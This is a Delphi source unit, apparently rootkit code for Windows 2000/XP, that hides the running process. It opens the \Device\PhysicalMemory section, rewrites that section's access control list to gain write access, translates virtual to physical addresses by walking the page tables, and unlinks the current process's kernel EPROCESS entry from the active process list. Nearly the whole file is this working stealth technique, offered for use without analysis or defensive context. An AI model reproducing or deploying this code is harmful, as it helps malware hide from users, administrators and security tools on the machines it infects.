unit HideProcess;

interface

function MyHideProcess: Boolean;

implementation

uses
  Windows, AclAPI, accCtrl;

type
  NTSTATUS = LongInt;

const
  //NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
  STATUS_INFO_LENGTH_MISMATCH = NTSTATUS($C0000004);
  STATUS_ACCESS_DENIED = NTSTATUS($C0000022);
  OBJ_INHERIT = $00000002;
  OBJ_PERMANENT = $00000010;
  OBJ_EXCLUSIVE = $00000020;
  OBJ_CASE_INSENSITIVE = $00000040;
  OBJ_OPENIF = $00000080;
  OBJ_OPENLINK = $00000100;
  OBJ_KERNEL_HANDLE = $00000200;
  OBJ_VALID_ATTRIBUTES = $000003F2;

type
  PIO_STATUS_BLOCK = ^IO_STATUS_BLOCK;
  IO_STATUS_BLOCK = record
    Status: NTSTATUS;
    FObject: DWORD;
  end;

  PUNICODE_STRING = ^UNICODE_STRING;
  UNICODE_STRING = record
    Length: Word;
    MaximumLength: Word;
    Buffer: PWideChar;
  end;

  POBJECT_ATTRIBUTES = ^OBJECT_ATTRIBUTES;
  OBJECT_ATTRIBUTES = record
    Length: DWORD;
    RootDirectory: Pointer;
    ObjectName: PUNICODE_STRING;
    Attributes: DWORD;
    SecurityDescriptor: Pointer;
    SecurityQualityOfService: Pointer;
  end;

  TZwOpenSection = function(SectionHandle: PHandle;
    DesiredAccess: ACCESS_MASK;
    ObjectAttributes: POBJECT_ATTRIBUTES): NTSTATUS; stdcall;
  TRTLINITUNICODESTRING = procedure(DestinationString: PUNICODE_STRING;
    SourceString: PWideChar); stdcall;

var
  RtlInitUnicodeString: TRTLINITUNICODESTRING = nil;
  ZwOpenSection: TZwOpenSection = nil;
  g_hNtDLL: THandle = 0;
  g_pMapPhysicalMemory: Pointer = nil;
  g_hMPM: THandle = 0;
  g_hMPM2: THandle = 0;
  g_osvi: OSVERSIONINFO;
  b_hide: Boolean = false;
//---------------------------------------------------------------------------

function InitNTDLL: Boolean;
begin
  g_hNtDLL := LoadLibrary('ntdll.dll');

  if 0 = g_hNtDLL then
  begin
    Result := false;
    Exit;
  end;

  RtlInitUnicodeString := GetProcAddress(g_hNtDLL, 'RtlInitUnicodeString');
  ZwOpenSection := GetProcAddress(g_hNtDLL, 'ZwOpenSection');

  Result := True;
end;
//---------------------------------------------------------------------------

procedure CloseNTDLL;
begin
  if (0 <> g_hNtDLL) then
    FreeLibrary(g_hNtDLL);
  g_hNtDLL := 0;
end;
//---------------------------------------------------------------------------

procedure SetPhyscialMemorySectionCanBeWrited(hSection: THandle);
var
  pDacl: PACL;
  pSD: PPSECURITY_DESCRIPTOR;
  pNewDacl: PACL;
  dwRes: DWORD;
  ea: EXPLICIT_ACCESS;
begin
  pDacl := nil;
  pSD := nil;
  pNewDacl := nil;

  dwRes := GetSecurityInfo(hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, nil, nil, pDacl, nil, pSD);

  if ERROR_SUCCESS <> dwRes then
  begin
    if Assigned(pSD) then
      LocalFree(Hlocal(pSD^));
    if Assigned(pNewDacl) then
      LocalFree(HLocal(pNewDacl));
  end;

  ZeroMemory(@ea, sizeof(EXPLICIT_ACCESS));
  ea.grfAccessPermissions := SECTION_MAP_WRITE;
  ea.grfAccessMode := GRANT_ACCESS;
  ea.grfInheritance := NO_INHERITANCE;
  ea.Trustee.TrusteeForm := TRUSTEE_IS_NAME;
  ea.Trustee.TrusteeType := TRUSTEE_IS_USER;
  ea.Trustee.ptstrName := 'CURRENT_USER';

  dwRes := SetEntriesInAcl(1, @ea, pDacl, pNewDacl);

  if ERROR_SUCCESS <> dwRes then
  begin
    if Assigned(pSD) then
      LocalFree(Hlocal(pSD^));
    if Assigned(pNewDacl) then
      LocalFree(HLocal(pNewDacl));
  end;

  dwRes := SetSecurityInfo

  (hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, nil, nil, pNewDacl, nil);

  if ERROR_SUCCESS <> dwRes then
  begin
    if Assigned(pSD) then
      LocalFree(Hlocal(pSD^));
    if Assigned(pNewDacl) then
      LocalFree(HLocal(pNewDacl));
  end;

end;
//---------------------------------------------------------------------------

function OpenPhysicalMemory: THandle;
var
  status: NTSTATUS;
  physmemString: UNICODE_STRING;
  attributes: OBJECT_ATTRIBUTES;
  PhyDirectory: DWORD;
begin
  g_osvi.dwOSVersionInfoSize := sizeof(OSVERSIONINFO);
  GetVersionEx(g_osvi);

  if (5 <> g_osvi.dwMajorVersion) then
  begin
    Result := 0;
    Exit;
  end;

  case g_osvi.dwMinorVersion of
    0: PhyDirectory := $30000;
    1: PhyDirectory := $39000;
  else
    begin
      Result := 0;
      Exit;
    end;
  end;

  RtlInitUnicodeString(@physmemString, '\Device\PhysicalMemory');

  attributes.Length := SizeOf(OBJECT_ATTRIBUTES);
  attributes.RootDirectory := nil;
  attributes.ObjectName := @physmemString;
  attributes.Attributes := 0;
  attributes.SecurityDescriptor := nil;
  attributes.SecurityQualityOfService := nil;

  status := ZwOpenSection(@g_hMPM, SECTION_MAP_READ or SECTION_MAP_WRITE, @attributes);

  if (status = STATUS_ACCESS_DENIED) then
  begin
    ZwOpenSection(@g_hMPM, READ_CONTROL or WRITE_DAC, @attributes);
    SetPhyscialMemorySectionCanBeWrited(g_hMPM);
    CloseHandle(g_hMPM);

    status := ZwOpenSection(@g_hMPM, SECTION_MAP_READ or SECTION_MAP_WRITE, @attributes);
  end;

  if not (LongInt(status) >= 0) then
  begin
    Result := 0;
    Exit;
  end;

  g_pMapPhysicalMemory := MapViewOfFile(g_hMPM,
    FILE_MAP_READ or FILE_MAP_WRITE, 0, PhyDirectory, $1000);

  if (g_pMapPhysicalMemory = nil) then
  begin
    Result := 0;
    Exit;
  end;

  Result := g_hMPM;
end;
//---------------------------------------------------------------------------
function LinearToPhys(BaseAddress: PULONG; addr: Pointer): Pointer;
var
  VAddr, PGDE, PTE, PAddr, tmp: DWORD;
begin
  VAddr := DWORD(addr);
//  PGDE := BaseAddress[VAddr shr 22];
  PGDE := PULONG(DWORD(BaseAddress) + (VAddr shr 22) * SizeOf(ULONG))^; // Modify by dot.

  if 0 = (PGDE and 1) then
  begin
    Result := nil;
    Exit;
  end;

  tmp := PGDE and $00000080;

  if (0 <> tmp) then
  begin
    PAddr := (PGDE and $FFC00000) + (VAddr and $003FFFFF);
  end
  else
  begin
    PGDE := DWORD(MapViewOfFile(g_hMPM, 4, 0, PGDE and $FFFFF000, $1000));
//    PTE := (PDWORD(PGDE))[(VAddr and $003FF000) shr 12];
    PTE := PDWORD(PGDE + ((VAddr and $003FF000) shr 12) * SizeOf(DWord))^; // Modify by dot.

    if (0 = (PTE and 1)) then
    begin
      Result := nil;
      Exit;
    end;

    PAddr := (PTE and $FFFFF000) + (VAddr and $00000FFF);
    UnmapViewOfFile(Pointer(PGDE));
  end;

  Result := Pointer(PAddr);
end;
//---------------------------------------------------------------------------

function GetData(addr: Pointer): DWORD;
var
  phys, ret: DWORD;
  tmp: PDWORD;
begin
  phys := ULONG(LinearToPhys(g_pMapPhysicalMemory, Pointer(addr)));
  tmp := PDWORD(MapViewOfFile(g_hMPM, FILE_MAP_READ or FILE_MAP_WRITE, 0,
    phys and $FFFFF000, $1000));

  if (nil = tmp) then
  begin
    Result := 0;
    Exit;
  end;

//  ret := tmp[(phys and $FFF) shr 2];
  ret := PDWORD(DWORD(tmp) + ((phys and $FFF) shr 2) * SizeOf(DWord))^; // Modify by dot.
  UnmapViewOfFile(tmp);

  Result := ret;
end;
//---------------------------------------------------------------------------

function SetData(addr: Pointer; data: DWORD): Boolean;
var
  phys: DWORD;
  tmp: PDWORD;
begin
  phys := ULONG(LinearToPhys(g_pMapPhysicalMemory, Pointer(addr)));
  tmp := PDWORD(MapViewOfFile(g_hMPM, FILE_MAP_WRITE, 0, phys and $FFFFF000, $1000));

  if (nil = tmp) then
  begin
    Result := false;
    Exit;
  end;

//  tmp[(phys and $FFF) shr 2] := data;
  PDWORD(DWORD(tmp) + ((phys and $FFF) shr 2) * SizeOf(DWord))^ := data; // Modify by dot.
  UnmapViewOfFile(tmp);

  Result := TRUE;
end;
//---------------------------------------------------------------------------
{long __stdcall exeception(struct _EXCEPTION_POINTERS *tmp)
begin
 ExitProcess(0);
 return 1 ;
end }
//---------------------------------------------------------------------------

function YHideProcess: Boolean;
var
  thread, process: DWORD;
  fw, bw: DWORD;
begin
//  SetUnhandledExceptionFilter(exeception);
  if (FALSE = InitNTDLL) then
  begin
    Result := FALSE;
    Exit;
  end;

  if (0 = OpenPhysicalMemory) then
  begin
    Result := FALSE;
    Exit;
  end;

  thread := GetData(Pointer($FFDFF124)); //kteb
  process := GetData(Pointer(thread + $44)); //kpeb

  if (0 = g_osvi.dwMinorVersion) then
  begin
    fw := GetData(Pointer(process + $A0));
    bw := GetData(Pointer(process + $A4));

    SetData(Pointer(fw + 4), bw);
    SetData(Pointer(bw), fw);

    Result := TRUE;
  end
  else if (1 = g_osvi.dwMinorVersion) then
  begin
    fw := GetData(Pointer(process + $88));
    bw := GetData(Pointer(process + $8C));

    SetData(Pointer(fw + 4), bw);
    SetData(Pointer(bw), fw);

    Result := TRUE;
  end
  else
  begin
    Result := False;
  end;

  CloseHandle(g_hMPM);
  CloseNTDLL;
end;

function MyHideProcess: Boolean;
begin
  if not b_hide then
  begin
    b_hide := YHideProcess;
  end;

  Result := b_hide;
end;

end.
